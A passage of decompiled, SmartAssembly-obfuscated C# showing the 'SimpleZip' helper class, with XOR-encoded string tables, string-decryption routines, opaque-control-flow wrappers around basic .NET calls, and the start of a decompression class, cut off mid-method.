            SimpleZip.ExceptionMessage = Ⴈ.ႷႭ.ႰႨ(Ⴈ.ႳႷ.Ⴗ(2059790398, 4), UsageReportSender.Ⴃ(ex, 75, 119), 54, 4);
            throw;
          }
          num23 = 0;
          switch (num23)
          {
            case 1:
              break;
            default:
              numArray6 = numArray5;
              break;
          }
        }
        catch (Exception ex)
        {
          objArray = new object[39]
          {
            (object) ⴍⴐ,
            (object) ⴄⴗ1,
            (object) dateTime,
            (object) Ⴈ1,
            (object) numArray1,
            (object) maxValue,
            (object) Ⴈ2,
            (object) num2,
            (object) length,
            (object) num3,
            (object) numArray2,
            (object) Ⴗ1,
            (object) num4,
            (object) Ⴗ2,
            (object) num5,
            (object) Ⴈ3,
            (object) num6,
            (object) Ⴓ,
            (object) num7,
            (object) ⴄⴗ2,
            (object) Ⴗ3,
            (object) num8,
            (object) Ⴗ4,
            (object) num9,
            (object) num10,
            (object) inputBuffer1,
            (object) cryptoIndirector1,
            (object) desCryptoTransform,
            (object) numArray3,
            (object) inputBuffer2,
            (object) cryptoIndirector2,
            (object) aesCryptoTransform,
            (object) numArray4,
            (object) ex,
            (object) numArray5,
            (object) Ⴗ,
            (object) Ⴄ,
            (object) Ⴈ,
            (object) Ⴃ
          };
          object[] objects = objArray;
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
        switch (0)
        {
          default:
            return numArray6;
        }
      }
      catch (Exception ex)
      {
        int num24;
        object[] objects = new object[56]
        {
          (object) ⴍⴐ,
          (object) ⴄⴗ1,
          (object) dateTime,
          (object) Ⴈ1,
          (object) numArray1,
          (object) maxValue,
          (object) Ⴈ2,
          (object) num2,
          (object) length,
          (object) num3,
          (object) numArray2,
          (object) Ⴗ1,
          (object) num4,
          (object) Ⴗ2,
          (object) num5,
          (object) Ⴈ3,
          (object) num6,
          (object) Ⴓ,
          (object) num7,
          (object) ⴄⴗ2,
          (object) Ⴗ3,
          (object) num8,
          (object) Ⴗ4,
          (object) num9,
          (object) num10,
          (object) inputBuffer1,
          (object) cryptoIndirector1,
          (object) desCryptoTransform,
          (object) numArray3,
          (object) inputBuffer2,
          (object) cryptoIndirector2,
          (object) aesCryptoTransform,
          (object) numArray4,
          (object) ex,
          (object) numArray5,
          (object) objArray,
          (object) numArray6,
          (object) num1,
          (object) num11,
          (object) num12,
          (object) num13,
          (object) num14,
          (object) num15,
          (object) num16,
          (object) num17,
          (object) num18,
          (object) num19,
          (object) num20,
          (object) num21,
          (object) num22,
          (object) num23,
          (object) num24,
          (object) Ⴗ,
          (object) Ⴄ,
          (object) Ⴈ,
          (object) Ⴃ
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    public SimpleZip()
    {
      try
      {
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static SimpleZip()
    {
      char[] chArray1;
      int num;
      char[] chArray2;
      try
      {
        SimpleZip.ႭႼ = new char[8]
        {
          char.MinValue,
          '\u0005',
          char.MinValue,
          '\u2E78',
          'ⴑ',
          '⇴',
          'ᝯ',
          '㬍'
        };
        chArray1 = new char[8]
        {
          '\u2E55',
          char.MinValue,
          char.MinValue,
          '\u1756',
          '㭏',
          char.MinValue,
          '㕞',
          char.MinValue
        };
        chArray1[1] = 'ⴤ';
        chArray1[2] = '⇅';
        chArray1[5] = '⩱';
        chArray1[7] = 'ᅪ';
        SimpleZip.ႷႳ = new string[1];
        SimpleZip.ႭႠ = chArray1;
        num = 6;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 7:
              chArray2[0] = 'ሀ';
              chArray2[7] = 'ᓘ';
              chArray2[4] = 'ም';
              num = 5;
              continue;
            case 1:
              SimpleZip.Ⴗ = new char[877]
              {
                char.MinValue,
                ',',
                char.MinValue,
                'ቋ',
                '㲦',
                'ኙ',
                '㌓',
                'ት',
                'Օ',
                '؆',
                'ᒟ',
                'ሷ',
                '㲧',
                'ኃ',
                '㌵',
                'ቜ',
                'չ',
                'ص',
                'ᒐ',
                'ቈ',
                '㲣',
                'ኩ',
                '㍠',
                'ሤ',
                'ճ',
                '؟',
                'ᒒ',
                'ሷ',
                '㲥',
                'ን',
                '㌕',
                'ሯ',
                'ԓ',
                'ؑ',
                'ᒚ',
                'ቮ',
                '㲘',
                'ኘ',
                '㌾',
                'ቫ',
                'Ս',
                'ض',
                'ᒯ',
                'ሸ',
                '㲲',
                'ዜ',
                '㌠',
                '\u0001',
                '\a',
                char.MinValue,
                '㲧',
                'ኼ',
                '㌍',
                'ሤ',
                'Ԛ',
                '؏',
                'ᒙ',
                '\u0002',
                '\a',
                char.MinValue,
                'ኌ',
                '㍠',
                'ታ',
                'Ճ',
                'د',
                'ᒋ',
                '\u1259',
                '\u0003',
                '\u0006',
                char.MinValue,
                '㌉',
                'ች',
                'շ',
                'ا',
                'ᒞ',
                'ቡ',
                '\u0004',
                'n',
                char.MinValue,
                '\u1249',
                'Ջ',
                'ؽ',
                'ᒫ',
                'ሠ',
                '㲣',
                'ኜ',
                '㌫',
                'ቸ',
                'Վ',
                'ض',
                'ᒴ',
                'ቹ',
                '㳢',
                'ኇ',
                '㌹',
                'ቮ',
                'ԃ',
                'ض',
                'ᒽ',
                'ብ',
                '㲬',
                'ዏ',
                '㌺',
                'ቨ',
                'Պ',
                'ظ',
                'ᒬ',
                'ሠ',
                '㲵',
                'ኆ',
                '㌬',
                'ት',
                'ԃ',
                'ص',
                'ᒶ',
                'ሠ',
                '㲧',
                'ኙ',
                '㌹',
                'ቱ',
                'Ֆ',
                'ص',
                'ᒬ',
                'ቩ',
                '㲭',
                'ኁ',
                '㍸',
                'ቫ',
                'Ն',
                'ئ',
                'ᒫ',
                'ቩ',
                '㲭',
                'ኁ',
                '㍸',
                'ቲ',
                'Յ',
                'ٴ',
                'ᒋ',
                'ቭ',
                '㲣',
                'ኝ',
                '㌬',
                'ቜ',
                'Ր',
                'ا',
                'ᒽ',
                'ቭ',
                '㲠',
                'ኃ',
                '㌡',
                'ሱ',
                'ԃ',
                'ص',
                'ᒶ',
                'ቤ',
                '㳢',
                'ኛ',
                '㌰',
                'ቸ',
                'Ց',
                'ر',
                'ᒾ',
                'ቯ',
                '㲰',
                'ኊ',
                '㍸',
                'ቾ',
                'Ղ',
                'غ',
                'ᒶ',
                'ቯ',
                '㲶',
                'ዏ',
                '㌺',
                'ቸ',
                'ԃ',
                'ذ',
                'ᒱ',
                'ታ',
                '㲶',
                'ኝ',
                '㌱',
                'ቿ',
                'Ֆ',
                'ؠ',
                'ᒽ',
                'ቤ',
                '㳬',
                '\u0005',
                '$',
                char.MinValue,
                'թ',
                'ػ',
                'ᒱ',
                'ቮ',
                '㳢',
                'ኛ',
                '㌰',
                'ቸ',
                'ԃ',
                'إ',
                'ᒭ',
                'ቡ',
                '㲮',
                'ኆ',
                '㌬',
                'ቤ',
                'ԃ',
                'ؽ',
                'ᒵ',
                'ተ',
                '㲰',
                'ኀ',
                '㌮',
                'ቸ',
                'Վ',
                'ر',
                'ᒶ',
                'ቴ',
                '㳢',
                'ኟ',
                '㌪',
                'ቲ',
                'Մ',
                'ئ',
                'ᒹ',
                'ቭ',
                '\u0006',
                '\u0005',
                char.MinValue,
                'ر',
                'ᒪ',
                'ቲ',
                '㲭',
                'ኝ',
                '\a',
                '\u0016',
                char.MinValue,
                'ᒏ',
                'ቲ',
                '㲭',
                'ኁ',
                '㌿',
                'ሽ',
                'ի',
                'ر',
                'ᒹ',
                'ቤ',
                '㲧',
                'ኝ',
                '㍸',
                '\u124E',
                'Պ',
                'س',
                'ᒶ',
                'ቡ',
                '㲶',
                'ኚ',
                '㌪',
                'ቸ',
                '\b',
                '\u0006',
                char.MinValue,
                'ቻ',
                '㲦',
                '\u128E',
                '㌬',
                'ቼ',
                '՞',
                '\t',
                '\u001B',
                char.MinValue,
                '㲗',
                'ኁ',
                '㌰',
                'ቼ',
                'Ս',
                'ذ',
                'ᒴ',
                'ብ',
                '㲦',
                'ኪ',
                '㌠',
                'ቾ',
                'Ն',
                'ؤ',
                'ᒬ',
                'ቩ',
                '㲭',
                'ኁ',
                '㍶',
                'ቔ',
                'կ',
                '؛',
                'ᒾ',
                'ቦ',
                '㲱',
                'ኊ',
                '㌬',
                '\n',
                '!',
                char.MinValue,
                'ኺ',
                '㌶',
                'ት',
                'Ղ',
                'غ',
                'ᒼ',
                'ቬ',
                '㲧',
                'ኋ',
                '㌝',
                'ብ',
                'Հ',
                'ر',
                'ᒨ',
                'ቴ',
                '㲫',
                'ኀ',
                '㌶',
                'ሳ',
                'լ',
                'ض',
                'ᒲ',
                'ብ',
                '㲡',
                'ኛ',
                '㌫',
                'ሳ',
                'կ',
                'ر',
                'ᒶ',
                'ቧ',
                '㲶',
                'ኇ',
                '\v',
                '\u001F',
                char.MinValue,
                '㌍',
                'ታ',
                'Ջ',
                'ص',
                'ᒶ',
                'ቤ',
                '㲮',
                'ኊ',
                '㌼',
                'ቘ',
                '՛',
                'ط',
                'ᒽ',
                'ተ',
                '㲶',
                'ኆ',
                '㌷',
                'ታ',
                'ԍ',
                '؛',
                'ᒺ',
                'ቪ',
                '㲧',
                'ኌ',
                '㌬',
                'ቮ',
                'ո',
                'د',
                'ᓨ',
                'ች',
                '㲟',
                '\f',
                '\u0005',
                char.MinValue,
                'ቜ',
                'հ',
                'ؗ',
                'ᒑ',
                '\u1249',
                '\r',
                '\u000E',
                char.MinValue,
                'ԁ',
                '٨',
                'ᒊ',
                'ቓ',
                '㲃',
                'ኤ',
                '㌽',
                'ቤ',
                'յ',
                'ص',
                'ᒴ',
                'ት',
                '㲧',
                'ዑ',
                '\u000E',
                '\r',
                char.MinValue,
                '؇',
                'ᒡ',
                'ታ',
                '㲶',
                'ኊ',
                '㌵',
                'ሳ',
                'հ',
                'ؠ',
                'ᒪ',
                'ቩ',
                '㲬',
                'ኈ',
                '\u000F',
                '+',
                char.MinValue,
                'ᒋ',
                'ቭ',
                '㲣',
                'ኝ',
                '㌬',
                'ቜ',
                'Ր',
                'ا',
                'ᒽ',
                'ቭ',
                '㲠',
                'ኃ',
                '㌡',
                'ሳ',
                'բ',
                'ؠ',
                'ᒬ',
                'ቲ',
                '㲫',
                'ኍ',
                '㌭',
                'ቩ',
                'Ն',
                'ا',
                'ᓶ',
                'ቐ',
                '㲭',
                'ኘ',
                '㌽',
                'ቯ',
                'Ն',
                'ذ',
                'ᒚ',
                'ቹ',
                '㲃',
                'ኛ',
                '㌬',
                'ቯ',
                'Պ',
                'ض',
                'ᒭ',
                'ቴ',
                '㲧',
                '\u0010',
                '\u0001',
                char.MinValue,
                'ራ',
                '\u0011',
                '\b',
                char.MinValue,
                '㲖',
                'ኖ',
                '㌨',
                'ቸ',
                'խ',
                'ص',
                'ᒵ',
                'ብ',
                '\u0012',
                '\r',
                char.MinValue,
                'ኮ',
                '㌬',
                'ቩ',
                'Ղ',
                'ط',
                'ᒰ',
                'ብ',
                '㲦',
                'ኩ',
                '㌱',
                'ቱ',
                'Ն',
                'ا',
                '\u0013',
                '\n',
                char.MinValue,
                '㌋',
                'ቩ',
                'Ղ',
                'ط',
                'ᒳ',
                'ቆ',
                '㲰',
                '\u128E',
                '㌵',
                'ቸ',
                '\u0014',
                '\u0011',
                char.MinValue,
                '\u124E',
                'Վ',
                'ص',
                'ᒪ',
                'ቴ',
                '㲃',
                'ኜ',
                '㌫',
                'ቸ',
                'Վ',
                'ض',
                'ᒴ',
                'ቹ',
                '㳬',
                'ኊ',
                '㌠',
                'ቸ',
                '\u0015',
                '¨',
                char.MinValue,
                'Ջ',
                'ؠ',
                'ᒬ',
                'ተ',
                '㳸',
                'ዀ',
                '㍷',
                'ቪ',
                'Ք',
                'أ',
                'ᓶ',
                'ቲ',
                '㲧',
                'ኋ',
                '㍵',
                'ቺ',
                'Ղ',
                'ؠ',
                'ᒽ',
                'ሮ',
                '㲡',
                'ኀ',
                '㌵',
                'ሲ',
                'Փ',
                'ئ',
                'ᒷ',
                'ቤ',
                '㲷',
                'ኌ',
                '㌬',
                'ቮ',
                'Ԍ',
                'ذ',
                'ᒷ',
                'ቴ',
                '㲬',
                'ኊ',
                '㌬',
                'ሰ',
                'Շ',
                'ر',
                'ᒮ',
                'ብ',
                '㲮',
                'ኀ',
                '㌨',
                'ተ',
                'Ն',
                'غ',
                'ᒬ',
                'ሯ',
                '㲱',
                'ኂ',
                '㌹',
                'ቯ',
                '\u0557',
                'ص',
                'ᒫ',
                'ታ',
                '㲧',
                'ኂ',
                '㌺',
                'ቱ',
                '՚',
                'ٻ',
                'ᓧ',
                'ት',
                '㲶',
                'ኂ',
                '㌇',
                'ቮ',
                'Ռ',
                'ء',
                'ᒪ',
                'ባ',
                '㲧',
                'ዒ',
                '㌫',
                'ተ',
                'Ղ',
                'ئ',
                'ᒬ',
                'ቡ',
                '㲱',
                'ኜ',
                '㌽',
                'ተ',
                'Ձ',
                'ظ',
                'ᒡ',
                'ት',
                '㲫',
                'ዉ',
                '㌭',
                'ቩ',
                'Վ',
                '؋',
                'ᒵ',
                'ብ',
                '㲦',
                'ኆ',
                '㌭',
                'ተ',
                'Ԟ',
                'ا',
                'ᒭ',
                'ተ',
                '㲲',
                'ኀ',
                '㌪',
                'ቩ',
                'Տ',
                'ؽ',
                'ᒶ',
                'ቫ',
                '㳤',
                'ኚ',
                '㌬',
                'ተ',
                'ռ',
                'ط',
                'ᒷ',
                'ቮ',
                '㲶',
                'ኊ',
                '㌶',
                'ቩ',
                'Ԟ',
                'ص',
                'ᒽ',
                'ቲ',
                '㲦',
                'ኆ',
                '㌹',
                'ቱ',
                'Ռ',
                'س',
                'ᒺ',
                'ቯ',
                '㲺',
                'ዉ',
                '㌭',
                'ቩ',
                'Վ',
                '؋',
                'ᒻ',
                'ቡ',
                '㲯',
                'ኟ',
                '㌹',
                'ቴ',
                'Մ',
                'غ',
                'ᓥ',
                'ታ',
                '㲯',
                '\u128E',
                '㌪',
                'ቩ',
                'Ղ',
                'ا',
                'ᒫ',
                'ብ',
                '㲯',
                'ኍ',
                '㌴',
                'ቤ',
                '\u0016',
                '\u0018',
                char.MinValue,
                '\u0604',
                'ᒷ',
                'ቷ',
                '㲧',
                'ኝ',
                '㌽',
                'ቹ',
                'ԃ',
                'ض',
                'ᒡ',
                'ሠ',
                '㲑',
                'ኂ',
                '㌹',
                'ቯ',
                '\u0557',
                'ؕ',
                'ᒫ',
                'ታ',
                '㲧',
                'ኂ',
                '㌺',
                'ቱ',
                '՚',
                '\u0017',
                '\u0011',
                char.MinValue,
                'ᒈ',
                'ቲ',
                '㲧',
                'ኙ',
                '㌱',
                'ቲ',
                'Ֆ',
                'ا',
                'ᒝ',
                'ቸ',
                '㲡',
                'ኊ',
                '㌨',
                'ቩ',
                'Պ',
                'ػ',
                'ᒶ',
                '\u0018',
                '\u0010',
                char.MinValue,
                'ሳ',
                '㳳',
                'ኍ',
                '㌾',
                'ሮ',
                'ԛ',
                '١',
                'ᓮ',
                'ቡ',
                '㲦',
                'ዜ',
                '㍮',
                'ሩ',
                'Ն',
                '٧',
                'ᓭ',
                '\u0019',
                '\n',
                char.MinValue,
                '㲇',
                'ኽ',
                '㌊',
                'ሽ',
                'ԑ',
                '٤',
                'ᓨ',
                'ሲ',
                '㳸',
                'ዏ',
                '\u001A',
                '\u0012',
                char.MinValue,
                'ዉ',
                '㌋',
                'ቸ',
                'Ս',
                'ذ',
                'ᓸ',
                'ቅ',
                '㲰',
                'ኝ',
                '㌷',
                'ቯ',
                'ԃ',
                '؆',
                'ᒽ',
                'ተ',
                '㲭',
                'ኝ',
                '㌬',
                '\u001B',
                '\u0014',
                char.MinValue,
                '㌌',
                'ቯ',
                'Ղ',
                'غ',
                'ᒫ',
                'ቦ',
                '㲧',
                'ኝ',
                '㌪',
                'ቴ',
                'Ս',
                'س',
                'ᓸ',
                'ቲ',
                '㲧',
                'ኟ',
                '㌷',
                'ቯ',
                '\u0557',
                'ٺ',
                '\u001C',
                '\t',
                char.MinValue,
                'ሻ',
                '\u0560',
                'ػ',
                'ᒶ',
                'ቴ',
                '㲫',
                'ኁ',
                '㌭',
                'ቸ',
                '\u001D',
                '\u0015',
                char.MinValue,
                'ճ',
                'ظ',
                'ᒹ',
                'ቴ',
                '㲤',
                'ኀ',
                '㌪',
                'ተ',
                'ԃ',
                '؛',
                'ᒋ',
                'ሠ',
                '㲀',
                'ኆ',
                '㌬',
                'ታ',
                'Ն',
                'ا',
                'ᒫ',
                'ሺ',
                '㳢',
                '\u001E',
                '\u000E',
                char.MinValue,
                '\u061D',
                'ᒫ',
                '\u1257',
                '㲭',
                'ኘ',
                '㍮',
                'ሩ',
                'ճ',
                'ئ',
                'ᒷ',
                'ባ',
                '㲧',
                'ኜ',
                '㌫',
                '\u001F',
                '\u0006',
                char.MinValue,
                'ᒄ',
                'ሪ',
                '㳬',
                'ኍ',
                '㌱',
                'ታ'
              };
              chArray2 = new char[8];
              num = 2;
              continue;
            case 2:
              chArray2[5] = 'ԣ';
              chArray2[3] = '㍘';
              chArray2[1] = '㳂';
              num = 0;
              continue;
            case 3:
              num = 4;
              continue;
            case 4:
              goto label_8;
            case 5:
              chArray2[2] = 'ዯ';
              chArray2[6] = 'ٔ';
              SimpleZip.Ⴅ = new string[32];
              goto case 3;
            default:
              SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
              goto case 1;
          }
        }
label_8:
        SimpleZip.Ⴍ = chArray2;
      }
      catch (Exception ex)
      {
        char[] o1 = chArray2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num;
        char[] o3 = chArray1;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    internal static string Ⴓ([In] int obj0, [In] int obj1)
    {
      int num;
      int index1;
      char[] ⴗ;
      int index2;
      string str;
      int length1;
      char[] chArray;
      char[] ⴍ;
      int length2;
      int index3;
      try
      {
label_3:
        index1 = obj0 ^ 661403062 ^ obj1;
        ⴗ = SimpleZip.Ⴗ;
        index2 = (int) ⴗ[index1];
        num = 13;
        while (true)
        {
          switch (num)
          {
            case 0:
              index3 = 1 + index3;
              num = 7;
              continue;
            case 2:
              chArray = new char[length1];
              goto case 8;
            case 3:
              goto label_5;
            case 4:
              length1 = (int) ⴗ[index1 + 1];
              length1 = ((int) ⴗ[index1 + 2] << 16) + length1;
              num = 2;
              continue;
            case 5:
            case 7:
              num = index3 < length1 ? 6 : 9;
              continue;
            case 6:
            case 11:
              chArray[index3] = (char) ((uint) ⴗ[index1 + index3] ^ (uint) ⴍ[(index3 + index2) % length2]);
              num = 0;
              continue;
            case 8:
              ⴍ = SimpleZip.Ⴍ;
              length2 = ⴍ.Length;
              index1 += 3;
              num = 12;
              continue;
            case 9:
              goto label_13;
            case 10:
              goto label_3;
            case 12:
              index3 = 0;
              num = 7;
              continue;
            case 13:
              num = (str = SimpleZip.Ⴅ[index2]) == null ? 4 : 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.Ⴓ);
              num = 10;
              continue;
          }
        }
label_5:
        return str;
label_13:
        str = new string(chArray);
        SimpleZip.Ⴅ[index2] = str;
        return str;
      }
      catch (Exception ex)
      {
        object[] objects = new object[12]
        {
          (object) index1,
          (object) index2,
          (object) length1,
          (object) ⴗ,
          (object) str,
          (object) chArray,
          (object) ⴍ,
          (object) length2,
          (object) index3,
          (object) num,
          (object) obj0,
          (object) obj1
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    internal static bool ႭႭ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 44:
            num2 = 5;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 6:
              num1 = 3;
              continue;
            case 1:
            case 4:
              num1 = 3;
              continue;
            case 3:
              goto label_3;
            case 5:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႭ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return File.Exists(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static bool ႭႷ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 89:
            num2 = 5;
            break;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 5:
            case 6:
              goto label_8;
            case 2:
            case 7:
              num1 = 4;
              continue;
            case 3:
              num1 = 4;
              continue;
            case 4:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႷ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.IsPrimitive;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static int ႭႤ([In] Array obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case (int) sbyte.MaxValue:
            num2 = 1;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              num1 = 4;
              continue;
            case 1:
            case 5:
            case 7:
              goto label_8;
            case 2:
              num1 = 4;
              continue;
            case 4:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႤ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.GetLength(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Array o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static StringBuilder ႭႥ(
      [In] StringBuilder obj0,
      [In] int obj1,
      [In] int obj2,
      [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 15:
            num2 = 4;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
              goto label_3;
            case 1:
              num1 = 5;
              continue;
            case 3:
              num1 = 5;
              continue;
            case 4:
            case 6:
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႥ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return obj0.Append(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        StringBuilder o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static int ႭႣ([In] string obj0, [In] char obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 109:
            num2 = 3;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 2:
            case 4:
              num1 = 6;
              continue;
            case 3:
              goto label_8;
            case 5:
            case 7:
              num1 = 6;
              continue;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႣ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return obj0.IndexOf(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<char> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static string ႭႨ([In] int obj0, [In] int obj1)
    {
      int index1;
      char[] ⴍⴜ;
      int index2;
      string str;
      int length1;
      char[] chArray;
      char[] ⴍⴀ;
      int length2;
      int index3;
      try
      {
        index1 = obj0 ^ 1491049167 ^ obj1;
        ⴍⴜ = SimpleZip.ႭႼ;
        index2 = (int) ⴍⴜ[index1];
        if ((str = SimpleZip.ႷႳ[index2]) != null)
          return str;
        length1 = (int) ⴍⴜ[index1 + 1];
        length1 = ((int) ⴍⴜ[index1 + 2] << 16) + length1;
        chArray = new char[length1];
        ⴍⴀ = SimpleZip.ႭႠ;
        length2 = ⴍⴀ.Length;
        index1 += 3;
        for (index3 = 0; index3 < length1; index3 = 1 + index3)
          chArray[index3] = (char) ((uint) ⴍⴜ[index1 + index3] ^ (uint) ⴍⴀ[(index3 + index2) % length2]);
        str = new string(chArray);
        SimpleZip.ႷႳ[index2] = str;
        return str;
      }
      catch (Exception ex)
      {
        object[] objects = new object[11]
        {
          (object) index1,
          (object) index2,
          (object) length1,
          (object) ⴍⴜ,
          (object) str,
          (object) chArray,
          (object) ⴍⴀ,
          (object) length2,
          (object) index3,
          (object) obj0,
          (object) obj1
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    internal sealed class ႤႰ
    {
      private static readonly int[] Ⴐ;
      private static readonly int[] Ⴈ;
      private static readonly int[] Ⴅ;
      private static readonly int[] Ⴍ;
      private SimpleZip.ႤႤ Ⴀ;
      private SimpleZip.ႤႭ Ⴐ;
      private SimpleZip.ႤႣ Ⴗ;
      private SimpleZip.ႤႳ Ⴗ;
      private SimpleZip.ႤႳ Ⴅ;
      private AppPathFinder.Ⴗ Ⴓ;

      public ႤႰ(byte[] Ⴐ)
      {
        int num;
        try
        {
          try
          {
            this.Ⴀ = new SimpleZip.ႤႤ();
            this.Ⴐ = new SimpleZip.ႤႭ();
            num = 2;
            this.Ⴓ.Ⴃ = num;
            this.Ⴀ.Ⴃ(Ⴐ, 0, Ⴐ.Length);
          }
          catch (Exception ex)
          {
            byte[] o2 = Ⴐ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          byte[] o3 = Ⴐ;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      private bool Ⴗ()
      {
        int num1;
        int num2;
        int ⴃ;
        int Ⴓ;
        bool flag;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        int num8;
        int num9;
        int num10;
        int num11;
        int num12;
        int num13;
        int num14;
        int num15;
        try
        {
          try
          {
            num1 = 7;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num1 = this.Ⴓ.Ⴗ <= 0 ? 19 : 34;
                  continue;
                case 1:
                  Ⴓ = this.Ⴅ.Ⴈ(this.Ⴀ);
                  num1 = Ⴓ >= 0 ? 10 : 21;
                  continue;
                case 2:
                  this.Ⴐ.Ⴐ(Ⴓ);
                  num1 = --num2 >= 258 ? 4 : 16;
                  continue;
                case 3:
                  goto label_38;
                case 4:
                  num1 = ((Ⴓ = this.Ⴗ.Ⴈ(this.Ⴀ)) & -256) == 0 ? 2 : 6;
                  continue;
                case 5:
                  num1 = Ⴓ >= 0 ? 14 : 22;
                  continue;
                case 6:
                case 25:
                  num1 = Ⴓ >= 257 ? 20 : 5;
                  continue;
                case 8:
                case 12:
                  ⴃ = this.Ⴓ.Ⴃ;
                  int num16;
                  switch (ⴃ)
                  {
                    case 7:
                      num16 = 4;
                      break;
                    case 8:
                      num16 = 0;
                      break;
                    case 9:
                      num16 = 1;
                      break;
                    case 10:
                      num16 = 30;
                      break;
                    default:
                      num16 = 11;
                      break;
                  }
                  num1 = num16;
                  continue;
                case 9:
                  this.Ⴀ.Ⴅ(this.Ⴓ.Ⴗ);
                  SimpleZip.ႤႰ ⴄⴐ1 = this;
                  num8 = ⴄⴐ1.Ⴓ.Ⴓ + num7;
                  ⴄⴐ1.Ⴓ.Ⴓ = num8;
                  num1 = 19;
                  continue;
                case 10:
                  num10 = SimpleZip.ႤႰ.Ⴅ[Ⴓ];
                  this.Ⴓ.Ⴈ = num10;
                  num11 = SimpleZip.ႤႰ.Ⴍ[Ⴓ];
                  this.Ⴓ.Ⴗ = num11;
                  num1 = 30;
                  continue;
                case 11:
